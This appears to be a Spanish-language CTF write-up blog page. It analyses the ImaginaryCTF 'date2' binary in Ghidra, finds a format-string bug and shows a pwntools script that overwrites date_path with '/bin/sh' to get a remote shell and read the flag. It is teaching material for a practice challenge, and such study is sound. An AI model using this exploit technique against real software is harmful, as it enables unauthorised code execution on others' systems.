@@ -1,0 +1,545 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>ImaginaryCTF date2 - GOT overwrite - c4rta</title>
+<meta name="description" content="En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir GOT">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:title" content="ImaginaryCTF date2 - GOT overwrite">
+<meta property="og:url" content="http://localhost:4000/imaginaryCTF-date2/">
+
+
+  <meta property="og:description" content="En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir GOT">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-07-30T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/imaginaryCTF-date2/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "c4rta",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categorias/" >Categorias</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">ImaginaryCTF date2 - GOT overwrite</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="c4rta" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c4rta</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CTF player<br>Apasionado a la ciberseguridad
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ic4rta" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="ImaginaryCTF date2 - GOT overwrite">
+    <meta itemprop="description" content="En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir GOT">
+    <meta itemprop="datePublished" content="July 30, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">ImaginaryCTF date2 - GOT overwrite
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-07-30T00:00:00-05:00">July 30, 2022 </time>&emsp;
+          
+          
+        </p>
+        <h2 id="contenido">Contenido</h2>
+
+<ul>
+  <li>Analizando el binario con Ghidra</li>
+  <li>Ejecutando el exploit</li>
+</ul>
+
+<h2 id="analizando-el-binario-con-ghidra">Analizando el binario con Ghidra</h2>
+
+<p>Este ejercicio es muy similar al enterior del post de GOT overwrite solo que ahora no podemos ver el codigo fuente del binario, asi que lo que nos toca es analizarlo con ghidra</p>
+
+<p>Lo primero que vamos a hacer es meter el binario a Ghidra la cual pueden descargar desde su repo oficial</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/NationalSecurityAgency/ghidra/releases
+</code></pre></div></div>
+<p>Despues en la seccion llamada <code class="language-plaintext highlighter-rouge">Symbool tree</code> desplegaremos la carpeta de <code class="language-plaintext highlighter-rouge">functions</code> y le damos click en main, como se ve en la imagen</p>
+
+<p><img src="/assets/images/imaginaryCTF-date2/ghidra1.png" alt="" /></p>
+
+<p>Esto nos arrojara del lado derecho de ghidra el codigo que trato de decompilar donde vemos todo esto:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Viendo la declaracion de variables en la parte de arriba, osea estas:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>long in_FS_OFFSET;
+char local_118 [264];
+long local_10;
+</code></pre></div></div>
+<p>Vemos una en particular que se declara como <code class="language-plaintext highlighter-rouge">char local_118 [264];</code>, esto es el buffer asi que vamos a renombrar la variable <code class="language-plaintext highlighter-rouge">local_118</code> a <code class="language-plaintext highlighter-rouge">buffer</code>, ahora nuestro codigo se ve asi:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Acortanto mas el codigo para mostrar lo que nos interesa queda el codigo asi:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Esto es sencillo de analizar lo que hace el binario es primeramente con <code class="language-plaintext highlighter-rouge">puts</code> mostrar el mensaje de <code class="language-plaintext highlighter-rouge">What\'s today\'s date?</code>, despues con <code class="language-plaintext highlighter-rouge">fgets(buffer,0x100,stdin);</code> recibe un input que se guardara en <code class="language-plaintext highlighter-rouge">buffer</code> donde el valor maximo que podemos guardar es <code class="language-plaintext highlighter-rouge">0x100</code>, esto pasandolo de hexadecimal a decimal nos da <code class="language-plaintext highlighter-rouge">256</code>, despues hay dos <code class="language-plaintext highlighter-rouge">puts</code> que imprimen unas cadenas (nada relevante), y finalmente la funcion <code class="language-plaintext highlighter-rouge">system</code> manda a llamar a lo que tiene <code class="language-plaintext highlighter-rouge">date_path</code>, y si en Ghidra le damos doble click sobre <code class="language-plaintext highlighter-rouge">date_path</code> vemos lo siguiente</p>
+
+<p><img src="/assets/images/imaginaryCTF-date2/ghidra2.png" alt="" /></p>
+
+<p>Aqui ya esta potente la cosa, por que se esta mandando a llamar al binario <code class="language-plaintext highlighter-rouge">date</code> desde la funcion <code class="language-plaintext highlighter-rouge">system</code> y se sabe que se esta llamando el binario date ya que la ruta es <code class="language-plaintext highlighter-rouge">/usr/bin/date</code>, asi que lo que vamos a hacer es sobreescribir el valor GOT de <code class="language-plaintext highlighter-rouge">date_path</code> por <code class="language-plaintext highlighter-rouge">/bin/sh</code> y como se esta usando la funcion <code class="language-plaintext highlighter-rouge">system</code> nos debe de ejecutar una sh</p>
+
+<h3 id="calculando-el-offset-el-buffer">Calculando el offset el buffer</h3>
+
+<p>De igual manera que el ejercicio anterior de GOT tenemos de encontrar el offset del buffer a travez de format string, asi que le pasaremos el binario algunas A y algunos format string <code class="language-plaintext highlighter-rouge">AAAAAAAA %p %p %p %p %p %p %p %p</code>, cuando lo ejecutemos nos muestra esto</p>
+
+<p><img src="/assets/images/imaginaryCTF-date2/vuln1.png" alt="" /></p>
+
+<p>Si empezamos a contar desde <code class="language-plaintext highlighter-rouge">0x7ffff7dfda63</code> hasta donde empiezan nuestras “A” que es donde esta seleccionado en la imagen nos da como resultado 6, asi que ese es el offset el buffer</p>
+
+<h2 id="ejecutando-el-exploit">Ejecutando el exploit</h2>
+
+<p>EL exploit usado es similar al del post anterior de GOT, lo que cambia es que nos estamos conectando remotamente a eth007.me.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"eth007.me"</span><span class="p">,</span> <span class="mi">42042</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">writes</span><span class="o">=</span><span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">date_path</span><span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)}))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Si lo ejecutamos y listamos el contenido podemos ver la flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Opening connection to eth007.me on port 42069: Done
+[*] '/home/kali/Desktop/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Switching to interactive mode
+no smh you are wrong the date is 
+$ ls
+flag.txt
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#formatstr" class="page__taxonomy-item" rel="tag">formatStr</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ghidra" class="page__taxonomy-item" rel="tag">ghidra</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#got-plt" class="page__taxonomy-item" rel="tag">got-plt</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#explotacion-binaria" class="page__taxonomy-item" rel="tag">Explotacion binaria</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-07-30T00:00:00-05:00">July 30, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/got-overwrite/" class="pagination--pager" title="GOT overwrite con Format String
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 c4rta</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
